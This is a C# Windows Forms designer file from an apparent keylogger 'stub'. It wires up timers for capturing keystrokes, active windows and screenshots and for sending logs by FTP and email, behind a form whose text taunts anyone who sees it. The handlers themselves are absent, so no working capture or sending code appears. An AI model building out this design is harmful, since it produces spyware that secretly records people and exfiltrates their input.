namespace stub
{
    partial class Form1
    {
        /// <summary>
        /// Variable del diseñador requerida.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Limpiar los recursos que se estén utilizando.
        /// </summary>
        /// <param name="disposing">true si los recursos administrados se deben eliminar; false en caso contrario, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Código generado por el Diseñador de Windows Forms

        /// <summary>
        /// Método necesario para admitir el Diseñador. No se puede modificar
        /// el contenido del método con el editor de código.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.capturar_teclas = new System.Windows.Forms.Timer(this.components);
            this.capturar_ventanas = new System.Windows.Forms.Timer(this.components);
            this.capturar_pantalla = new System.Windows.Forms.Timer(this.components);
            this.enviar_logs_by_ftp = new System.Windows.Forms.Timer(this.components);
            this.enviar_logs_by_mail = new System.Windows.Forms.Timer(this.components);
            this.panelcontrol = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // capturar_teclas
            // 
            this.capturar_teclas.Interval = 50;
            this.capturar_teclas.Tick += new System.EventHandler(this.capturar_teclas_Tick);
            // 
            // capturar_ventanas
            // 
            this.capturar_ventanas.Interval = 10;
            this.capturar_ventanas.Tick += new System.EventHandler(this.capturar_ventanas_Tick);
            // 
            // capturar_pantalla
            // 
            this.capturar_pantalla.Tick += new System.EventHandler(this.capturar_pantalla_Tick);
            // 
            // enviar_logs_by_ftp
            // 
            this.enviar_logs_by_ftp.Tick += new System.EventHandler(this.enviar_logs_by_ftp_Tick);
            // 
            // enviar_logs_by_mail
            // 
            this.enviar_logs_by_mail.Tick += new System.EventHandler(this.enviar_logs_by_mail_Tick);
            // 
            // panelcontrol
            // 
            this.panelcontrol.Tick += new System.EventHandler(this.panelcontrol_Tick);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(12, 26);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(215, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Se supone que no deberias verme , mierda !";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(242, 68);
            this.Controls.Add(this.label1);
            this.Name = "Form1";
            this.Text = "No me deberias verrme mierda !";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Timer capturar_teclas;
        private System.Windows.Forms.Timer capturar_ventanas;
        private System.Windows.Forms.Timer capturar_pantalla;
        private System.Windows.Forms.Timer enviar_logs_by_ftp;
        private System.Windows.Forms.Timer enviar_logs_by_mail;
        private System.Windows.Forms.Timer panelcontrol;
        private System.Windows.Forms.Label label1;


    }
}

